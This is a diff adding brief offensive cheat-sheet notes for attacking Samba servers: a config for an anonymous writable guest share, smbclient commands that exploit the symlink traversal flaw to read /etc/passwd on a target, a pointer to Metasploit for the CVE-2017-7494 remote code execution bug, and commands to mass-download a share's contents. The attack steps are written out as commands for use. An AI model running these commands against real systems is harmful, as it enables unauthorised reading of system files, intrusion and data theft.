@@ -1,0 +1,41 @@
+# samba
+
+# anonymous writable share
+cat > /etc/samba/smb.conf <<EOF
+[global]
+    log file = /var/log/samba/log
+    dns proxy = No
+    netbios name = SMBSERVER1337
+    server string = Samba Server
+    socket options = TCP_NODELAY
+    workgroup = TEST
+    os level = 20
+    max log size = 50
+    interfaces = lo virbr0 eth0
+    bind interfaces only = yes
+    map to guest = Bad User
+
+[l]
+    comment = L
+    path = /tmp/l
+    browseable = yes
+    writeable = yes
+    create mask = 444
+    guest ok = yes
+EOF
+
+# symlink (http://marc.info/?l=full-disclosure&m=126538598820903&w=2)
+smbclient -U'%' //1.2.3.4/blah
+symlink ../../../../../../../ tst
+more tst/etc/passwd
+posix_unlink lol or mount -t cifs and rm tst
+
+# rce dlopen CVE-2017-7494
+msf
+
+# download directory
+lcd blah
+cd blah
+prompt
+recurse
+mget *
